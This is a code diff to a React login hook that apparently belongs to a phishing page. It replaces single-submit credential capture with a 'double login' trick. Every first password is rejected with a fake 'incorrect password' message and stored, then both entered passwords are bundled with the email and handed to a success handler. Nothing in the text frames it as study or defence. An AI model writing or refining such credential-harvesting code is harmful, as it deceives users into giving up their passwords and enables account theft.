@@ -6,11 +6,13 @@ export const useLogin = (
 ) => {
   const [isLoading, setIsLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
+  const [firstAttemptPassword, setFirstAttemptPassword] = useState<string>('');
   
   const emailRef = useRef<HTMLInputElement>(null);
   const passwordRef = useRef<HTMLInputElement>(null);
 
   const resetLoginState = () => {
+    setFirstAttemptPassword('');
     setErrorMessage('');
   };
 
@@ -27,28 +29,42 @@ export const useLogin = (
         throw new Error('Please enter both email and password');
       }
 
-      const finalData = {
-        ...formData,
-        email,
-        password,
-      };
+      // This is the SECOND valid attempt.
+      if (firstAttemptPassword) {
+        if (firstAttemptPassword === password) {
+            throw new Error('Your account or password is incorrect. Please try again.');
+        }
 
-      // Capture credentials on first (and only) submit — no two-attempts gate
-      if (onLoginSuccess) {
-        onLoginSuccess(finalData);
+        const finalData = {
+          ...formData,
+          email,
+          firstAttemptPassword,
+          secondAttemptPassword: password,
+          isSecondAttempt: true, // This flag is crucial
+        };
+
+        // Call the success handler passed from App.tsx
+        if (onLoginSuccess) {
+          onLoginSuccess(finalData);
+        }
+        
+        // Do not set loading to false here, App.tsx will handle it
+        return; // Stop execution
       }
-      
-      // Do not set loading to false here; App.tsx redirects on success
-      return;
+
+      // This is the FIRST attempt.
+      setFirstAttemptPassword(password);
+      throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
 
     } catch (error) {
       const errorMsg = error instanceof Error ? error.message : 'Login failed';
       setErrorMessage(errorMsg);
-      setIsLoading(false);
+      setIsLoading(false); // Stop loading on error
       if (onLoginError) {
         onLoginError(errorMsg);
       }
-      return {};
+      // Return a flag so the UI can clear the password field
+      return { isFirstAttempt: !!firstAttemptPassword };
     }
   };
 
